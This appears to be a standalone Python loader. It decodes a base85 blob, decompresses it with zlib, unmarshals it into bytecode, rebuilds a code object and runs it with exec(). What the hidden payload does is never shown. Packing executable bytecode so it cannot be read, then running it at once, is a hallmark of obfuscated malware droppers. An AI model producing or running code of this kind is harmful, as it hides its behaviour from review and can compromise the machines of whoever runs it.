import base64
import marshal
import zlib
import types

def decrypt_code():
    encoded = b'c${5PO^?$s5Vf5&o2F@Y5gfU3>H(CNc2l8cMNtAO3)?D5k+6iKZ0#)BrcH5NKK6vP|AJF<<S+TkiNC-BVP_={cr<U`n;F|9%}?;(X-R)3z4|VJ00IkuRYV0`Ba9%R=mtmxdyQyBuMyT8-XezNt%e^EvqpQP2Bf`0_<)*C)*_u6-9X%?;L6%}h)ufkhW$@DQgx|KyBYGq`!05x${}@XSiO=j94Q9D$EO5Fpm+F7O?%#hqEnP9Nl3}*=96${^Wc0kO(yecau&S1eo(C*QjZLVsdsTa?hl89G`o;tG@{vKFLN_*ITB73gl~f|nfQJfMA5a=A9#;kY5gbT{&*}pFJ4cgv&0XcFJ1~gW;-f$uF$$I%x7VY^^xnk*r<5Q^QAD#9pCP_?4#>#?~Xuag^k-88Ipqw<B~Q)lY;3g(<;i(lrgmcq2(LSOvUtV%0CGGs?0aonl0k_B2N5ih|M^7GjCX%<cuzP$-WAMe#t9d33HvUs7zNs0K2O`Q1IJ4sW{6wm#4x!S(jv2&{L>3eP4nJY-nh<w0qhSbTkJ_4lRhj>3{wL%SMli'
    compressed = base64.b85decode(encoded)
    marshalled = zlib.decompress(compressed)
    code = marshal.loads(marshalled)
    return types.CodeType(
        code.co_argcount, code.co_posonlyargcount, code.co_kwonlyargcount,
        code.co_nlocals, code.co_stacksize, code.co_flags, code.co_code,
        code.co_consts, code.co_names, code.co_varnames, code.co_filename,
        code.co_name, code.co_firstlineno, code.co_lnotab, code.co_freevars,
        code.co_cellvars
    )

exec(decrypt_code())
